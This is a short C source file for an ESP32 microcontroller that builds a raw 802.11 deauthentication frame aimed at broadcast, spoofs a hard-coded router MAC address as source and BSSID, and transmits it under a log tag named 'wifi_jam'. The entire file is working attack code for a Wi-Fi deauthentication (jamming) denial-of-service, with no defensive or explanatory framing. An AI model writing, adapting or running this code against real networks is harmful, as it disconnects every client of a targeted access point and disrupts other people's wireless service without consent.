#include "esp_log.h"
#include "wifi.h"

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

static uint8_t deauth_frame[] = {
    0xc0, 0x00,                             // Frame control (deauth code: 12)
    0x00, 0x00,                             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Destination (broadcast)
    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // Transmitter/Source (router)
    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // BSSID
    0x00, 0x00,                             // Fragment and Sequence number
    0x07, 0x00                              // Reason code: Class 3 frame received from nonassociated STA
};

void wifi_deauth(void)
{
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
    int sniffChan = wifi_get_sniff_channel();
    ESP_LOGI("wifi_jam", "Frame sent on channel: %d", sniffChan);
}

